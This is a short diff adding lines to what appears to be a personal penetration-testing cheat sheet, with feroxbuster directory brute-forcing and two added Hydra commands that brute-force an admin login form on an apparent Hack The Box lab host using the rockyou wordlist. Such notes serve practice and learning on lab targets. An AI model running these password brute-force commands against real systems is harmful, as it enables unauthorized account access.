@@ -14,3 +14,12 @@ sudo mv nuclei /usr/local/bin/
 feroxbuster
 sudo apt install feroxbuster
 feroxbuster -u ** -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404,403 -t 100 -d 1 -x php,html -o results.txt
+
+
+
+
+
+
+Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt facts.htb http-post-form "/admin/login:user[username]=^USER^&user[password]=^PASS^:F=Username or Password incorrect" -t 32 -V
+hydra -l admin -P /usr/share/wordlists/rockyou.txt facts.htb http-post-form "/admin/login:user[username]=^USER^&user[password]=^PASS^:S=302" -t 32 -V
